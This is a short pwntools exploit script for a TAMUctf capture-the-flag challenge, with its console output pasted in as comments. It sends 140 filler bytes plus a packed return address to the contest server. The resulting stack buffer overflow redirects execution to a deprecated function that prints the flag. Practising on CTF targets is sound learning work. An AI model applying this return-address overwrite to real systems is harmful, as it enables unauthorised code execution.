from pwn import *

r = remote("pwn.ctf.tamu.edu", 4321)
flag = 0x0804854b
payload = "A"*140 + p32(flag)

r.send(payload)
print r.recv(2048)

#malhyuk@ubuntu:~/ctf/tamuctf$ python pwn2.py 
#[+] Opening connection to pwn.ctf.tamu.edu on port 4321: Done
#Enter a word to be echoed:
#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK\x85\x0
#This function has been deprecated
#gigem{D34D_FUNC_R1S1NG}
